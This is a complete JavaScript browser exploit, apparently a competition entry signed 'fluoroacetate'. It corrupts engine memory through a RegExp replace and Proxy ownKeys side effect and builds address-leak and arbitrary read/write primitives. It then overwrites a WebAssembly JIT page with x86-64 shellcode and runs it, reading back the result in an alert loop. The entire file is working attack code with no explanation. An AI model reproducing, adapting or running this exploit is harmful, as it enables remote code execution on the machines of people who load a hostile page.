function print(x){ document.write("<p><font size=50>"+x+"</font></p>"); }
function go(){
function ljust(x, n, c){ while (x.length < n) x = c+x; return x; }
function rjust(x, n, c){ x += c.repeat(n); return x; }
function clone64(x){ return [x[0],x[1]]; }
function tohex64(x){ return "0x"+ljust(x[1].toString(16),8,'0')+ljust(x[0].toString(16),8,'0'); }
var CONVERSION = new ArrayBuffer(8); var CONVERSION_U32 = new Uint32Array(CONVERSION); var CONVERSION_F64 = new Float64Array(CONVERSION);
function u32_to_f64(u){ CONVERSION_U32[0] = u[0]; CONVERSION_U32[1] = u[1]; return CONVERSION_F64[0]; }
function f64_to_u32(f, b=0){ CONVERSION_F64[0] = f; if (b) return CONVERSION_U32; return new Uint32Array(CONVERSION_U32); }
function fail(msg){ print(msg); document.location.reload(true); throw msg; }

function gc(){ for (let i=0;i<0x10;i++) new ArrayBuffer(0x800000); }

wasm_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 1, 127, 0, 96, 0, 0, 2, 25, 1, 7, 105, 109, 112, 111, 114, 116, 115, 13, 105, 109, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 0, 3, 2, 1, 1, 7, 17, 1, 13, 101, 120, 112, 111, 114, 116, 101, 100, 95, 102, 117, 110, 99, 0, 1, 10, 8, 1, 6, 0, 65, 42, 16, 0, 11]);
wasm_inst = new WebAssembly.Instance(new WebAssembly.Module(wasm_bytes), {imports: {imported_func: function(x){ return x; }}});
wasm_func = wasm_inst.exports.exported_func;

function to_dict(obj){
	obj.__defineGetter__('x',()=>2);
	obj.__defineGetter__('x',()=>2);
}

rgx = null;
dbl_arr = [1.1, 2.2, 3.3, 4.4];
o = {};
o.__defineGetter__("length", ()=>{
	rgx = new RegExp(/AAAAAAAA/y);
	return 2;
});
o[0] = "aaaa";
o.__defineGetter__(1, ()=>{
	for (let i=0;i<8;i++) dbl_arr.push(5.5);
	
	let cnt = 0;
	rgx[Symbol.replace]("AAAAAAAA", {
		toString: ()=>{
			cnt++;
			if (cnt == 2){
				rgx.lastIndex = {valueOf: ()=>{
					to_dict(rgx);
					gc();
					return 0;
				}};
			}
			return 'BBBB$';
		}
	});
	return "bbbb";
});
p = new Proxy({}, {
	ownKeys: function(target){
		return o;
	},
	getOwnPropertyDescriptor(target, prop) {
		return { configurable: true, enumerable: true, value: 5 };
	}
});

Object.keys(p);
if (dbl_arr[0] == 1.1){
	fail("failed to corrupt dbl_arr");
}
for (let i=0;i<0x800;i++)
	dbl_arr.push(0.0);

let obj_arr_elem_off = -1;

let obj_arr_tag = 0xbabe;
let obj_arr_tag_smi_float = u32_to_f64([0, obj_arr_tag]);
let obj_arr = null;
for (let tries=1;tries<=4;tries++){
	obj_arr = new Array(0x80).fill("x");
	for (let i=0;i<4;i++)
		obj_arr[i] = obj_arr_tag;

	for (let i=0;i<dbl_arr.length;i++){
		if (dbl_arr[i] == obj_arr_tag_smi_float &&
			dbl_arr[i+1] == obj_arr_tag_smi_float &&
			dbl_arr[i+2] == obj_arr_tag_smi_float &&
			dbl_arr[i+3] == obj_arr_tag_smi_float){
			obj_arr_elem_off = i;
			break;
		}
	}
	
	if (obj_arr_elem_off >= 0){
		break;
	}
}

if (obj_arr_elem_off < 0){
	fail("failed to find obj_arr_elem_off");
}

let obj_arr_off = obj_arr_elem_off - 8;

function leak_addr_float(x){
	obj_arr[0] = x;
	return dbl_arr[obj_arr_elem_off];
}
function leak_addr(x){
	return f64_to_u32(leak_addr_float(x));
}

let obj_arr_elem_addr = f64_to_u32(dbl_arr[obj_arr_elem_off - 6]);
let dbl_arr_elem_addr = clone64(obj_arr_elem_addr); dbl_arr_elem_addr[0] -= (obj_arr_elem_off * 8 - 0x10);
let obj_arr_addr = clone64(obj_arr_elem_addr); obj_arr_addr[0] -= 0x30;

function dbl_arr_idx_for_addr(x){
	v = clone64(x);
	v[0] -= dbl_arr_elem_addr[0];
	if (v[0] < 0){
		v[0] += 0x100000000;
		v[1] -= 1;
	}
	return v[0] / 8;
}

let ua = new Uint32Array(0x1000);
ua[0] = 0x41414141;
ua[1] = 0x42424242;

let ua_addr = leak_addr(ua);

let tmp, tmp_idx;
tmp_idx = dbl_arr_idx_for_addr(ua_addr);
tmp = f64_to_u32(dbl_arr[tmp_idx+2]);
tmp_idx = dbl_arr_idx_for_addr(tmp);

let ua_store_idx = tmp_idx + 3;

function r32(addr){
	dbl_arr[ua_store_idx] = u32_to_f64(addr);
	return ua[0];
}

function r64(addr){
	dbl_arr[ua_store_idx] = u32_to_f64(addr);
	return [ua[0], ua[1]];
}

function w32(addr, v){
	dbl_arr[ua_store_idx] = u32_to_f64(addr);
	ua[0] = v;
}

function w64(addr, v){
	dbl_arr[ua_store_idx] = u32_to_f64(addr);
	ua[0] = v[0];
	ua[1] = v[1];
}

tmp = leak_addr(wasm_func);
tmp[0] += 0x18 - 1; tmp = r64(tmp);
tmp[0] += 8 - 1; tmp = r64(tmp);
let tmp_clone = clone64(tmp);
tmp[0] += 0x10 - 1; tmp = r64(tmp);
tmp[0] += 0xe8 - 1;
let jit_page = r64(tmp);
tmp = tmp_clone; tmp[0] += 0x1c - 1;
let jit_off = r32(tmp);
let jit_addr = clone64(jit_page);
jit_addr[0] += jit_off;

let jit_ptr = clone64(jit_addr);

let sc = [0x314800eb,  0xff3148c0,  0x48f63148,  0x3148d231,  0xec8148c9,  0x100,  0x48c03148,  0x143d8d,  0x3fb00000,  0x8348050f,  0x87500f8,  0xc48148,  0xc3000001,  0x622ffeeb,  0x732f6e69,  0x90909068];

for (let i = 0; i < sc.length;i++){
	w32(jit_ptr, sc[i]);
	jit_ptr[0] += 4;
}

wasm_func();

let jit_ptr2 = clone64(jit_addr);
jit_ptr2[0] += sc.length * 4;

let leaked = "";
for (let i = sc.length; i < sc.length + 0x40; i++){
	let tmp = r32(jit_ptr2);
	if (tmp != 0){
		for (let j = 0; j < 4; j++){
			if ((tmp & 0xff) != 0)
				leaked += String.fromCharCode(tmp & 0xff);
			tmp >>= 8;
		}
	}
	jit_ptr2[0] += 4;
}
while (1){
	alert("pwned by fluoroacetate\n"+leaked);
	prompt("pwned by fluoroacetate", leaked);
}
}
function main(){
	try { go(); } catch(e){ alert(e); }
}